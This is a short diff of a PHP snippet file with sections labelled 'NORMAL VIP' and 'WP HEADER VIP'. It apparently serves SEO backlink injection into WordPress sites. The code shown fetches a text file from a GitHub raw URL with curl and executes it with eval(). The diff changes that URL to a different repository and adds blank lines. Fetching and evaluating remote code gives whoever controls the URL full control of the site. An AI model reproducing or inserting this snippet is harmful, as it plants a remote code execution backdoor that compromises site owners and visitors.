@@ -31,7 +31,7 @@ echo $result2;
 
 <----- NORMAL VIP ----->
 <?php
-$url = 'https://raw.githubusercontent.com//backlinkterpercaya/main/vip.txt';
+$url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
@@ -40,6 +40,9 @@ $fileContents = curl_exec($ch);
 curl_close($ch);
 eval("?>" . $fileContents);
 ?>
+
+
+
 
 <----- WP HEADER VIP ----->
 <?php
